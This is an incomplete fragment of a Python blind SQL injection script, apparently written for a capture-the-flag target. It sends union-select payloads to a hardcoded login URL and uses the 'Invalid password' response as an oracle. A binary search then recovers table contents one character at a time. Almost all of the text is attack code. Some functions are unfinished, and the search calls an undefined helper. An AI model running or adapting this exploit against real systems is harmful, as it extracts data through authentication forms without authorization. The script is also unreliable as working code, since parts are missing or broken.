...
def gen_condition(num, index, column):
    return f"where ascii(SUBSTRING({column}, {index}, 1))<{num}"

def gen_post_exploit(num, index, table, column):
    return {"username": f"' union select 'a' from {table} {gen_condition(num, index, column)} and '1'='1", "password":""}

def gen_get_exploit(num, index, table, column):
    return ""

def evalPost(num, index, table, column):
    data = gen_post_exploit(num, index, table, column)
    response = requests.post("http://35.227.24.107/b54f82cece/login", data=data, proxies=proxyDict)
    if "Invalid password" in response.text:
        return True
    return False

def evalGet(num, index):
    data = {"secretWord":"","go":"Go%21"}
    url = ""

def bsearch_char(index, left, right):
    if left == right - 1:
        return left
    elif right <= left:
    ...
    mid = (right + left) // 2
    if eval(mid, index):
        return bsearch_char(index, left, mid)
    else:
        return bsearch_char(index, mid, right)


# for char in range(100):
#     try:
#         val = bsearch_char(char, 0, 256)
#         print(char, val, chr(val))
#     except Exception as e:
